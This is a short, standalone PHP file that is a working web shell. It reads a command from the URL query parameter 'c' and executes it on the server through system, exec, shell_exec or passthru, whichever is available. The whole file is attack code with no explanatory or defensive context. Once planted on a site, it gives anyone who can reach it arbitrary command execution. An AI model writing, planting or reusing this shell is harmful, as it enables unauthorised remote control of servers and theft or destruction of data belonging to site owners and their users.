<?php
$c = $_GET['c'];
if(function_exists('system')) { system($c); }
elseif(function_exists('exec')) { exec($c, $o); echo implode("\n",$o); }
elseif(function_exists('shell_exec')) { echo shell_exec($c); }
elseif(function_exists('passthru')) { passthru($c); }
else { echo "disabled"; }
?>
